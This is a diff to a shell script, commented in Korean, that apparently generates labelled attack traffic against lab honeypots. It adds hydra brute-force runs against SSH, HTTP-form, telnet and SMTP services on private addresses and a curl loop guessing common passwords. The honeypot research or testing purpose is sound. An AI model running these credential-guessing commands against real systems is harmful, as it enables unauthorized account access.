@@ -31,13 +31,20 @@ hydra -l admin -P "$WORDLIST" \
     ssh://172.30.0.10:2222 \
     -e nsr 2>/dev/null || true
 
-# HTTP 폼 브루트포스 (Heralding:80)
+# HTTP 폼 브루트포스 (Heralding:80) - heralding은 / 경로에서 수신
 echo "[*] HTTP brute force against Heralding (172.30.0.11:80)"
 hydra -l admin -P "$WORDLIST" \
     -t 4 -f \
     -o /honeypot_logs/hydra_http.txt \
-    http-post-form://172.30.0.11/login:username=^USER^&password=^PASS^:Invalid \
+    "http-post-form://172.30.0.11/:username=^USER^&password=^PASS^:F=Invalid" \
     2>/dev/null || true
+
+# curl로도 직접 인증 시도 (hydra 실패 대비)
+for pass in password 123456 admin letmein; do
+    curl -s -X POST http://172.30.0.11/ \
+        -d "username=admin&password=${pass}" \
+        -o /dev/null || true
+done
 
 # MySQL 브루트포스 (Heralding:3306)
 echo "[*] MySQL brute force against Heralding (172.30.0.11:3306)"
@@ -53,6 +60,14 @@ hydra -l admin -P "$WORDLIST" \
     -t 4 -f \
     -o /honeypot_logs/hydra_telnet.txt \
     telnet://172.30.0.10:2223 \
+    2>/dev/null || true
+
+# SMTP 브루트포스 (Mailoney:25)
+echo "[*] SMTP brute force against Mailoney (172.30.0.15:25)"
+hydra -l admin -P "$WORDLIST" \
+    -t 4 -f \
+    -o /honeypot_logs/hydra_smtp.txt \
+    smtp://172.30.0.15:25 \
     2>/dev/null || true
 
 echo "{\"scenario\": \"${SCENARIO}\", \"label\": \"${LABEL}\", \"event\": \"end\", \"timestamp\": \"$(date -u +%Y-%m-%dT%H:%M:%SZ)\"}"
